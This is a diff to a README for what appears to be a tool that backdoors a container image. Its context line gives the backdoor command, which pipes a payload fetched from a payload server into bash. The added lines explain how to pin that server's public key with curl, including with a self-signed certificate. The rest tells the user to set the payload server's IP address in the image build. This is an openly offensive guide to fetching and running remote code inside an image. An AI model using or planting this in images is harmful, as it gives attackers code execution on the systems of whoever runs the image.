@@ -12,6 +12,16 @@ The line that ends up backdooring the image will be the following:
 
 ```curl -s http://<ip_address>:8000/payload.txt | bash```
 
+For added security use public key pinning:
+
+```curl -Iksv --pinnedpubkey sha256//0 https://<your_site>.com```
+
+Use the value from output called public key hash (This is the format curl will expect in the next command)
+
+```curl -sk --pinnedpubkey <format>//<key_hash> https://<your_site>.com```
+
+This will curl the website with the public key pinned (-k is used if you have a self signed certificate)
+
 ### Build the image
 
 * Update line 4 with the ip address of your payload server
